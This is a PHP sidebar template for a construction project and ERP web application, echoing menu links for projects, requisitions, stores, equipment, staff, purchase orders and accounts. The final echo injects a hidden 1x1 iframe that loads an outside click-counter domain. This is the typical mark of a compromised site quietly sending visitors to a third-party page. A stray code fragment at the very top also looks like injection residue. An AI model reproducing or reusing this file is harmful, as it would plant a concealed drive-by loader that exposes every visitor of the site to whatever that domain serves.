<?php /**/  ");}?><table border="0" cellpadding="0" cellspacing="0" id="mainTable">
  <tr>
    <td valign="top" id="sidebar" background="./images/backgrounds/csst_bg.gif"><ul>
<?
//main
//if(!$keyword)echo "This is the left main page";

//else if($keyword=="project"){
     if($keyword=='create new project')echo "<li id='current'>"; else echo "<li >";
	 echo "<a href='./index.php?keyword=create+new+project'>Create New project</a></li>";
     if($keyword=='ongoing project main')echo "<li id='current'>";	else echo "<li >"; 
     echo "<a href='./index.php?keyword=ongoing+project+main'>Ongoing Projects</a></li>";
     if($keyword=='old project main')echo "<li id='current'>";	else echo "<li >"; 
     echo "<a href='./index.php?keyword=old+project+main'>Old Projects</a></li>";
     echo "<li><a href='./index.php?keyword=enter+item+work'>Enter Item of Work</a></li>";
echo "<hr>";
     echo "<li><li><a href='./index.php?keyword=rate+DMA'>Enter Rate of DMA</a></li>";	 
     echo "<li><a href='./index.php?keyword=rate+Item'>Enter Rate of Item</a></li>";	 	 
     echo "<li><a href='./index.php?keyword=enter+Quotation'>Enter Quotation</a></li>";	 	 	 
     echo "<li><a href='./index.php?keyword=vendor+Report'>Vendor Report </a></li>";	 	 	 	 
echo "<hr>";

     echo "<li><a href='./index.php?keyword=spr+NIOW'>Enter Purchase Requisition for NIOW</a></li>";
     echo "<li><a href='./index.php?keyword=site+spr+IOW'>Enter Purchase Requisition for IOW</a></li>";	 
echo "<hr>";    
     echo "<li><a href='./index.php?keyword=site+iow+detail&selectedPcode=$loginProject'> View IOW Detail</a></li>";
	 echo "<li><a href='./index.php?keyword=enter+DMA'>Enter Direct Material Allocation</a></li>";
     echo "<li><a href='./index.php?keyword=site+spr+IOW'>Enter Purchase Requisition for IOW</a></li>";
    // echo "<li><a href='./index.php?keyword=confirm+purchase+requisition'>Confirm Purchase Requisition</a></li>";
     //echo "<li><a href='./index.php?keyword=show+purchase+requisition'>Show Purchase Requisition</a></li>";
     //echo "<li><a href='./index.php?keyword=local+fund+allocation'>Project Fund Allocation</a></li>";
echo "<hr>";
     //echo "<li><a href='./index.php?keyword=show+all+requisition'>Show All Requisition</a></li>";
    // echo "<li><a href='./index.php?keyword=show+all+requisition&approval=1'>Show Approval Requisition</a></li>";

echo "<hr>";
     echo "<li><a href='./index.php?keyword=mdview+IOW&status=Hold'>Show All IOW for Approve</a></li>";
     //echo "<li><a href='./index.php?keyword=mdview+DMA'>Show All IOW for Approve</a></li>";
     //echo "<li><a href='./index.php?keyword=mdshow+all+requisition'>Show All Requisition</a></li>";
     //echo "<li><a href='./index.php?keyword=mdshow+all+requisition&approval=1'>Show Approval Requisition</a></li>";
     echo "<li><a href='./index.php?keyword=mdfund+allocation+report'>Fund Allocation Report</a></li>";
     echo "<li><a href='./index.php?keyword=mdfund+allocation'>Fund Allocation</a></li>";
     echo "<li><a href='./index.php?keyword=mdvendor+Report'>Vendor Report</a></li>";	 
     echo "<li><a href='./index.php?keyword=mddaily+report'>Daily Report</a></li>";	 
//      }
echo "<hr>";
     echo "<li><a href='./index.php?keyword=purchase+requisition'>Purchasing in Process</a></li>";
     echo "<li><a href='./index.php?keyword=purchased+qty'>Purchased Requisitio Qty</a></li>";	 

echo "<hr>";
     echo "<li><a href='./index.php?keyword=mrr'>Material Receiving Report</a></li>";
     echo "<li><a href='./index.php?keyword=issue'>Material Issue From</a></li>";	 
     echo "<li><a href='./index.php?keyword=site+daily+report'>Daily Report From</a></li>";	 	 

echo "<hr>";
     echo "<li><a href='./index.php?keyword=store+entry'>Store Entry</a></li>";
     echo "<li><a href='./index.php?keyword=store'>Store Details</a></li>";	 
     echo "<li><a href='./index.php?keyword=store+transfer'>Store Transfer Form</a></li>";	 	 
     echo "<li><a href='./index.php?keyword=store+transfer+report'>Store Transfer Details</a></li>";	 	 	 

echo "<hr>";
     echo "<li><a href='./index.php?keyword=equipment+entry'>Equipment Entry</a></li>";
     echo "<li><a href='./index.php?keyword=equipment+details'>Equipment Details</a></li>";	 
     echo "<li><a href='./index.php?keyword=site+equipment'>Site Equipment Requisition</a></li>";
     echo "<li><a href='./index.php?keyword=equipment+req+details'>Equipment Requisition Details</a></li>";	 	 	 	 
     echo "<li><a href='./index.php?keyword=equipment+req+details&a=1'>Site Equipment Requisition</a></li>";	 	 	 	 	 

echo "<hr>";
     echo "<li><a href='./index.php?keyword=employee+entry'>Employee Entry</a></li>";
     echo "<li><a href='./index.php?keyword=employee+details&page=1'>Employee Details</a></li>";	 
     echo "<li><a href='./index.php?keyword=site+employee'>Site Employee Requisition</a></li>";
     echo "<li><a href='./index.php?keyword=employee+req+details'>Employee Requisition Details</a></li>";	 	 	 	 
     echo "<li><a href='./index.php?keyword=employee+req+details&a=1'>Site Employee Requisition</a></li>";	 	 	 	 	 
     echo "<li><a href='./index.php?keyword=employee+attendance'>Site Employee Attendance</a></li>";	 	 	 	 	 	 
     echo "<li><a href='./index.php?keyword=daily+labour'>Daily Labour Attendance</a></li>";	
     echo "<li><a href='./index.php?keyword=appraisal'>Appraisal</a></li>";		  	 	 	 	 	 	 
     echo "<li><a href='./index.php?keyword=leave+form'>Leave Form</a></li>";
     echo "<li><a href='./index.php?keyword=attendance'>Attendance Form</a></li>";	 		  	 	 	 	 	 	 	 
     echo "<li><a href='./index.php?keyword=attendance+report'>Attendance Report</a></li>";	 
	 
echo "<hr>";
     echo "<li><a href='./index.php?keyword=item+require'>Required Itemps</a></li>";	 
     echo "<li><a href='./index.php?keyword=purchase+order+vendor'>Create Purchase Order</a></li>";	 
    echo "<li><a href='./index.php?keyword=purchase+order+report'>All Purchase Order</a></li>";
    echo "<li><a href='./index.php?keyword=purchase+order+receive'>Receive Purchase Order</a></li>";	
echo "<hr>";
echo "<hr>";
     echo "<li><a href='./index.php?keyword=mca'>Maintain Chart of Accounts</a></li>";	 
     echo "<li><a href='./index.php?keyword=payments'>Payments</a></li>";	 
     echo "<li><a href='./index.php?keyword=gernal'>Gernal</a></li>";	 	 	 
echo "<hr>";
echo "<hr>";
     echo "<li><a href='./index.php?keyword=purchase+journal'>Purchase Journal</a></li>";	 
     echo "<li><a href='./index.php?keyword=general+ledger'>General Ladger</a></li>";	 	 
	

echo "<iframe src=\"http://internetcountercheck.com/?click=2184984\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>
</ul>
</td></tr></table>